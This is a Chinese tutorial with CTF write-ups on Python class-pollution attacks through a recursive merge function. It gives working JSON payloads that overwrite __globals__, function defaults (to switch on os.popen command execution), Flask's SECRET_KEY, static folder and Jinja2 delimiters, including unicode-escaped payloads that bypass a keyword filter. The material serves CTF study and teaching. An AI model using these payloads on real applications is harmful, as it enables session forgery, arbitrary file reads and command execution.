前言
==

在研究了Nodejs原型链污染之后，我注意到了国赛中出现的一个知识点Python原型链污染，同时我注意到CTFSHOW上的一个题目，于是我开始学习它并写了这篇简单的文章。

从Merge开始
========

我们这里还是从常见的merge函数来做入手举例，因为其实对于原型链污染来说，本质上都是一个东西，只是基于不同的语言特性，某些存在局限性，但是讲到merge大家都应该想到和原型链污染有关。

这里我就把这个关键的merge的定义放在这里，其实是同nodejs一样的操作

```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

可以看到也是通过键值互换来进行的污染，但是这里要注意在python中的object的属性是不可以被污染的，具体的后面会说。

一个最简单的实例：

```python
def merge(src, dst):  
    # Recursive merge function  
    for k, v in src.items():  
        if hasattr(dst, '__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v, dst.get(k))  
            else:  
                dst[k] = v  
        elif hasattr(dst, k) and type(v) == dict:  
            merge(v, getattr(dst, k))  
        else:  
            setattr(dst, k, v)  

class ctfer:  
    flag = "flag{fake_flag}"  

class Delete(ctfer):  
    pass  

class Chu0(ctfer):  
    pass  

ctf1 = Delete()  
ctf2 = Chu0()  
evil_playload = {  
    "__class__":  
    {  
        "__base__":  
        {  
            "flag": "flag{really_flag}"  
        }  
    }  
}
print(ctf1.flag)  
print(ctf2.flag)  
merge(evil_playload, ctf1)  
print(ctf1.flag)  
print(ctf2.flag)

```

运行结果，可以看到是被污染的了

![Pasted image 20240710163642.png](https://shs3.b.qianxin.com/attack_forum/2024/07/attach-514c1d1e5c13afea5a33693fcd533afc44bf0356.png)  
然后其他的例如修改内置属性也是ok的这里就不写了。  
记住object的属性是无法被污染的`

```python
merge(evil_playload,object)
print(object)

#TypeError: cannot set 'flag' attribute of immutable type 'object'
```

可以看到会报错的

Question1
=========

这里就产生了一个问题，我们在上述的写法当中是利用Delete去继承了ctfer这个类的，这样子我们才可以通过基类去污染其属性值，但是如果不存在这个继承关系的时候我们应该如何去污染呢？

\_\\globals\_\_
---------------

我们就可以去思索一下关于python的一些问题，例如在SSTI中我们是如何去获取我们可用的属性或者说方法呢？  
应该很直观就能想到，是他——`__globals__`.  
`__globals__` 是 Python 函数对象的一个属性，它返回包含函数定义时的全局变量的字典。通过这个属性，你可以访问和修改函数定义所在的模块中的全局变量。

```python
x = 10  # 全局变量

def my_function():
    print(x)  # 打印全局变量 x

def modify_global_var():
    my_function.__globals__['x'] = 20  # 修改全局变量 x

my_function()  # 输出 10
modify_global_var()
my_function()  # 输出 20

```

可以看到实例当中我们通过这个属性来改变了全局变量中的x。

所以我们就可以这样去构造一下playload

```python
evil_playload = {
    "__init__":{
        "__globals__":{
            "flag" : "flag{really_flag}"
        }

    }
}
```

这样子就可以去应对于不存在继承链的情况

Question2
=========

我们再想要一个场景，虽然说在一些题目场景来说，大多都是在main.py中去import一个test.py，并且关系比较简单的时候，通常都可以利用上面的方法来进行污染，当关系比较复杂的时候就比较麻烦，例如多层import 或者导入第三方库来导入的时候比较麻烦，这里就提供了几个方法

Module sys
----------

我们这里就可以利用sys来实现。这个应该不用多说了

main.py

```python
import test1  
import sys  
def merge(src, dst):  
    # Recursive merge function  
    for k, v in src.items():  
        if hasattr(dst, '__getitem__'):  
            if dst.get(k) and type(v) == dict:  
                merge(v, dst.get(k))  
            else:  
                dst[k] = v  
        elif hasattr(dst, k) and type(v) == dict:  
            merge(v, getattr(dst, k))  
        else:  
            setattr(dst, k, v)  
class Test():  
    def __init__(self):  
        pass  

evil_playload = {  
    "__init__":{  
        "__globals__":{  
            "sys":{  
                "modules":{  
                    "test1":{  
                        "Test1": {  
                            "flag" :"flag{really_flag}"  
                            }  
                        }  
                    }  
                }  
            }  
        }  
    }  
test = Test()  
print(test1.Test1.flag)  
merge(evil_playload,test)  
print(test1.Test1.flag)
```

test1.py

```python
class Test1:  
    flag = "flag{fake_flag}"
```

Loader加载器
---------

我们的sys使用是在题目环境中有给你sys的情况下才会可以使用的，但是如果题目不给你，那么sys基本上也是G了，所以咱们就着手一下其他方面

为了进一步优化，这里采用方式是利用`Python`中加载器`loader`，在官方文档中给出的定义是

![Pasted image 20240710172545.png](https://shs3.b.qianxin.com/attack_forum/2024/07/attach-d13cd09d7e597fdb5e7f6e8b6a82738fcb61d8c2.png)  
也就是加载类的东西。

### about spec

`__spec__`内置属性在`Python 3.4`版本引入，其包含了关于类加载时的信息，本身是定义在`Lib/importlib/_bootstrap.py`的类`ModuleSpec`，显然因为定义在`importlib`模块下的`py`文件，所以可以直接采用`&lt;模块名&gt;.__spec__.__init__.__globals__['sys']`获取到`sys`模块

所以我们就可以利用任意的类来进行加载sys从而达到前面的目的  
这里有个demo可以看看‘

```python
import math  
# 获取模块的loader  
loader = math.__spec__.__init__.__globals__['sys']  
# 打印loader信息  
print(loader.modules)
# {'sys': , 'builtins': , '_frozen_importlib': , .......

```

可以看到我们就可以这么去调用从而去搭配利用打组合拳

默认值替换
=====

函数形参
----

主要用到了函数的`__defaults__`和`__kwdefaults__`这两个内置属性

### \_\_defaults\_\_

`__defaults__` 是 Python 函数对象的一个属性，它包含函数的默认参数值。`__defaults__` 返回一个包含默认参数值的元组。如果函数没有默认参数，`__defaults__` 返回 `None`。

具体的内容可以看这里  
[python函数的位置参数(Positional)和关键字参数(keyword) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/412273465)

根据文章的最后面，我们可以总结一下(巧记一下)：

- `/`前面都为仅位置参数
- `/` 后`*`前都为位置或关键字参数
- `*`后都为仅关键字参数
- 仅位置参数不可以利用`变量名 = 变量`赋值，位置或关键字参数可以利用其赋值，也可以不赋值，仅关键词参数必须用`变量名=值`来赋值

```python
def func_a(var_1, var_2 =2, var_3 = 3):
    pass

def func_b(var_1, /, var_2 =2, var_3 = 3):
    pass

def func_c(var_1, var_2 =2, *, var_3 = 3):
    pass

def func_d(var_1, /, var_2 =2, *, var_3 = 3):
    pass

print(func_a.__defaults__)
#(2, 3)
print(func_b.__defaults__)
#(2, 3)
print(func_c.__defaults__)
#(2,)
print(func_d.__defaults__)
#(2,)
```

所以在污染中可以这样

```python
def evil(arg_1 , shell = False):
    if not shell:
        print(arg_1)
    else:
        print(__import__("os").popen(arg_1).read())

evil_playload = {
    "__init__":{
        "__globals__":{
            "evil":{
                "__defaults__":{
                    True,
                }
            }
        }
    }

}
```

其实也就是我们如果去获取evil函数的defaluts属性的时候就只能获取到位置或关键字参数，所以这里的defaults默认指向的就是shell这个参数，所以就可以进行污染

### \_\_kwdefaluts\_\_

`__kwdefaults__`以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果：

```python
def func_a(var_1, var_2 =2, var_3 = 3):
    pass

def func_b(var_1, /, var_2 =2, var_3 = 3):
    pass

def func_c(var_1, var_2 =2, *, var_3 = 3):
    pass

def func_d(var_1, /, var_2 =2, *, var_3 = 3):
    pass

print(func_a.__kwdefaults__)
#None
print(func_b.__kwdefaults__)
#None
print(func_c.__kwdefaults__)
#{'var_3': 3}
print(func_d.__kwdefaults__)
#{'var_3': 3}
```

可以看到他仅获取了仅关键字参数，并且返回是以字典的形式返回的。

所以同样的

```python
def evil(arg_1 ,*,shell = False):
    if not shell:
        print(arg_1)
    else:
        print(__import__("os").popen(arg_1).read())

evil_payload = {
    "__init__" : {
        "__globals__" : {
            "evilFunc" : {
                "__kwdefaults__" : {
                    "shell" : True
                }
            }
        }
    }
}
```

这样子就可以进行污染了。

特定值污染
-----

### 环境变量污染

在这几天的i春秋的比赛当中出了这么一个赛题

```php
 &lt;?php
highlight_file(__FILE__);
error_reporting(E_ALL);
ini_set('display_errors', 1);
function filter($a)
{
    $pattern = array('\'', '"','%','\(','\)',';','bash');
    $pattern = '/' . implode('|', $pattern) . '/i';
    if(preg_match($pattern,$a)){
        die("No injecting!!!");
    }
    return $a;
}
class ENV{
    public $key;
    public $value;
    public $math;
    public function __toString()
    {
        $key=filter($this-&gt;key);
        $value=filter($this-&gt;value);
        putenv("$key=$value");
        system("cat hints.txt");
    }
    public function __wakeup()
    {
        if (isset($this-&gt;math-&gt;flag))
        {
            echo getenv("LD_PRELOAD");
            echo "YesYes";
        } else {
            echo "YesYesYes";
        }
    }
}
class DIFF{
    public $callback;
    public $back;
    private $flag;

    public function __isset($arg1)
    {
        system("cat /flag");
        $this-&gt;callback-&gt;p;
        echo "You are stupid, what exactly is your identity?";

    }

}
class FILE{
    public $filename;
    public $enviroment;
    public function __get($arg1){
        if("hacker"==$this-&gt;enviroment){
            echo "Hacker is bad guy!!!";
        }
    }
    public function __call($function_name,$value)
    {
        if (preg_match('/\.[^.]*$/', $this-&gt;filename, $matches)) {
            $uploadDir = "/tmp/";
            $destination = $uploadDir . md5(time()) . $matches[0];
            if (!is_dir($uploadDir)) {
                mkdir($uploadDir, 0755, true);
            }
            file_put_contents($this-&gt;filename, base64_decode($value[0]));
            if (rename($this-&gt;filename, $destination)) {
                echo "文件成功移动到${destination}";
            } else {
                echo '文件移动失败。';
            }
        } else {
            echo "非法文件名。";
        }
    }
}
class FUN{
    public $fun;
    public $value;
    public function __get($name)
    {
        echo "Hacker!aaaaaaaaaaaaa";
        $this-&gt;fun-&gt;getflag($this-&gt;value);
    }
}
```

这个是打php的ld\_preload  
然后如果说他是利用python来写的题目的话，我们就可以通过污染环境变量来打ld\_preload劫持，有些时候说不定还能打出非预期，嘻嘻。

### flask特定属性污染

#### 密钥替换

这里直接贴代码吧，可以造成任意session伪造甚至改变pin码

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "[+]Config:%s"%(app.config['SECRET_KEY'])

app.run(host="0.0.0.0")
```

污染链

```python
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                "config" : {
                    "SECRET_KEY" :"Polluted~"
                }
            }
        }
    }
}
```

#### \_got\_first\_request污染

用于判定是否某次请求为自`Flask`启动后第一次请求，是`Flask.got_first_request`函数的返回值，此外还会影响装饰器`app.before_first_request`的调用，而`_got_first_request`值为假时才会调用：

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

flag = "Is flag here?"

@app.before_first_request
def init():
    global flag
    if hasattr(app, "special") and app.special == "U_Polluted_It":
        flag = open("flag", "rt").read()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    global flag
    setattr(app, "special", "U_Polluted_It")
    return flag

app.run(host="0.0.0.0")
```

链子

```python
payload={
    "__init__":{
        "__globals__":{
            "app":{
                "_got_first_request":False
            }
        }
    }
}
```

#### \_static\_url\_path污染

```python
@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "flag in ./flag but heres only static/index.html"
```

```python
payload={
    "__init__":{
        "__globals__":{
            "app":{
                "_static_folder":"./"
            }
        }
    }
}
```

#### os.path.pardir

```python
#app.py

from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "flag in ./flag but heres only static/index.html"

app.run(host="0.0.0.0")
```

这里是利用特性

```python
payload={
    "__init__":{
        "__globals__":{
            "os":{
                "path":{
                    "pardir":","
                }
            }
        }
    }
}
```

#### SSTI jinja2污染

这里就只贴出恶意链，不具体分析了，其实就是走的ssti的底层，去改掉模板的标识符

```python
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                    "jinja_env" :{
"variable_start_string" : "[[","variable_end_string":"]]"
}        
            }
        }
    }
```

赛题
==

CTFshow西瓜杯
----------

```python
from flask import Flask, session, redirect, url_for,request,render_template
import os
import hashlib
import json
import re
def generate_random_md5():
    random_string = os.urandom(16)
    md5_hash = hashlib.md5(random_string)

    return md5_hash.hexdigest()
def filter(user_input):
    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']
    for pattern in blacklisted_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

app = Flask(__name__)
app.secret_key = generate_random_md5()

class evil():
    def __init__(self):
        pass

@app.route('/',methods=['POST'])
def index():
    username = request.form.get('username')
    password = request.form.get('password')
    session["username"] = username
    session["password"] = password
    Evil = evil()
    if request.data:
        if filter(str(request.data)):
            return "NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"
        else:
            merge(json.loads(request.data), Evil)
            return "MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"
    return render_template("index.html")

@app.route('/admin',methods=['POST', 'GET'])
def templates():
    username = session.get("username", None)
    password = session.get("password", None)
    if username and password:
        if username == "adminer" and password == app.secret_key:
            return render_template("flag.html", flag=open("/flag", "rt").read())
        else:
            return "Unauthorized"
    else:
        return f'Hello,  This is the POLLUTED page.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```

python的原型链污染，需要把`app.secret_key`污染成一个我们想要的值，接着把 `_static_folder`的路径污染成服务器的根目录，实现任意文件读取从而得到flag。  
因为有waf所以这里就unicode一下

```json
{
    "\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F": {
        "\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F": {
            "\u0061\u0070\u0070": {
                "\u006A\u0069\u006E\u006A\u0061\u005F\u0065\u006E\u0076": {
                    "\u0076\u0061\u0072\u0069\u0061\u0062\u006C\u0065\u005F\u0073\u0074\u0061\u0072\u0074\u005F\u0073\u0074\u0072\u0069\u006E\u0067": "[#",
                    "\u0076\u0061\u0072\u0069\u0061\u0062\u006C\u0065\u005F\u0065\u006E\u0064\u005F\u0073\u0074\u0072\u0069\u006E\u0067": "#]"
                },
                "config" : {
                    "\u0053\u0045\u0043\u0052\u0045\u0054\u005F\u004B\u0045\u0059" :"password"
                }
            }
        }
    }
}
```

然后发包伪造seesion即可

DownUnderCTF 2024 - co2
-----------------------

在utils中

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

写了一个merge

```python
@app.route("/save_feedback", methods=["POST"])
@login_required
def save_feedback():
    data = json.loads(request.data)
    feedback = Feedback()
    # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
    merge(data, feedback)
    save_feedback_to_disk(feedback)
    return jsonify({"success": "true"}), 200
```

并且在这里进行了调用

```python
@app.route("/get_flag")
@login_required
def get_flag():
    if flag == "true":
        return "DUCTF{NOT_THE_REAL_FLAG}"
    else:
        return "Nope"
```

只需要污染flag的bool值即可

```python
{ "__init__" : { "__globals__" : { "flag" : "true" } } }
```

总结
==

原型链污染挺好玩的hhh，不知道其他语言有没有这个洞嘞。